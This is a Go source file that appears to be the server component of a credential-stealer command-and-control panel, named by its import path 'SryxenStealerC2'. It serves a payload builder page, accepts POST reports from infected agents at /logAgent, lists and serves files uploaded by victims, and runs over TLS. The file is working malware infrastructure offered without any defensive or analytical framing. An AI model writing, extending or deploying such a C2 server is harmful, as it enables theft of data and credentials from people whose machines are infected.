package Server

import (
	"encoding/json"
	"fmt"
	"log"
	"net/http"
	"os"
	"path/filepath"
	"SryxenStealerC2/Router"
	"github.com/gorilla/mux"
)

type ServerState struct {
	server *http.Server
}

func GetAgents() ([]map[string]string, error) {
	uploadDir := "uploads"

	files, err := os.ReadDir(uploadDir)
	if err != nil {
		return nil, err
	}

	var agents []map[string]string
	for _, file := range files {
		if !file.IsDir() { 
			agents = append(agents, map[string]string{
				"name": file.Name(),
				"file": file.Name(),
			})
		}
	}
	return agents, nil
}

func GetCertPath(certType string) string {
	goodDir := "Certs"
	return filepath.Join(goodDir, certType)
}

func (s *ServerState) Run(address string, port int) {
	r := mux.NewRouter()
    Router.AddBuilderHandler(r)

	r.HandleFunc("/", Router.ServeHTMLFiles)
	r.HandleFunc("/clients", Router.ServeHTMLFiles)

	Router.ServeStaticFiles(r)

	r.HandleFunc("/logAgent", Router.HandleLogAgent).Methods("POST")
	r.HandleFunc("/builder", Router.ServeHTMLFiles).Methods("GET")

	r.HandleFunc("/agents", func(w http.ResponseWriter, r *http.Request) {
		agents, err := GetAgents()
		if err != nil {
			http.Error(w, "Failed to retrieve agents: "+err.Error(), http.StatusInternalServerError)
			return
		}

		w.Header().Set("Content-Type", "application/json")
		err = json.NewEncoder(w).Encode(agents)
		if err != nil {
			http.Error(w, "Failed to encode JSON response", http.StatusInternalServerError)
		}
	}).Methods("GET")

	r.Handle("/uploads/{fileName}", http.StripPrefix("/uploads", http.FileServer(http.Dir("uploads"))))

	s.server = &http.Server{
		Addr:    address + ":" + fmt.Sprintf("%d", port),
		Handler: r,
	}

	fmt.Printf("Starting server on %s:%d...\n", address, port)

	certFile := GetCertPath("certfile.pem")
	keyFile := GetCertPath("keyfile.pem")

	if _, err := os.Stat(certFile); os.IsNotExist(err) {
		log.Fatalf("SSL certificate not found: %v", err)
	}
	if _, err := os.Stat(keyFile); os.IsNotExist(err) {
		log.Fatalf("SSL key file not found: %v", err)
	}

	err := s.server.ListenAndServeTLS(certFile, keyFile)
	if err != nil {
		log.Fatalf("Failed to start server: %v", err)
	}
}
